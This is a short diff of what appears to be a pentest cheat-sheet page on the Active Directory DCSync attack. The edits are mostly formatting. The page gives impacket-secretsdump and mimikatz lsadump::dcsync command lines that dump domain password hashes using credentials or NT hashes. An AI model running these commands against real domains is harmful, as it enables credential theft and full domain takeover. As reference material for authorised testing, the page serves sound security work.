@@ -4,7 +4,6 @@ date: 2024-7-9
 tags: ["GetChanges", "GetChangesAll", "dcsync", "secretsdump", "active driectory", "ad", "Windows"]
 ---
 
----
 #### Abuse #1: DCSync Attack
 
 {{< tab set1 tab1 active >}}Linux{{< /tab >}}
@@ -13,14 +12,14 @@ tags: ["GetChanges", "GetChangesAll", "dcsync", "secretsdump", "active driectory
 
 <div>
 
-```bash
+```console
 # With creds
-impacket-secretsdump -just-dc <USER>:<PASSWORD>@<TARGET>
+impacket-secretsdump -just-dc '<USER>:<PASSWORD>@<TARGET>'
 ```
 
-```bash
+```console
 # With hashes
-impacket-secretsdump -hashes <LM>:<NT> -just-dc <DOMAIN>/<USER>@<TARGET>
+impacket-secretsdump -hashes <HASH> -just-dc '<DOMAIN>/<USER>@<TARGET>'
 ```
 
 </div>
@@ -30,7 +29,7 @@ impacket-secretsdump -hashes <LM>:<NT> -just-dc <DOMAIN>/<USER>@<TARGET>
 
 <div>
 
-```powershell
+```console
 .\mimikatz.exe 'lsadump::dcsync /domain:<DOMAIN> /user:administrator' exit
 ```
 
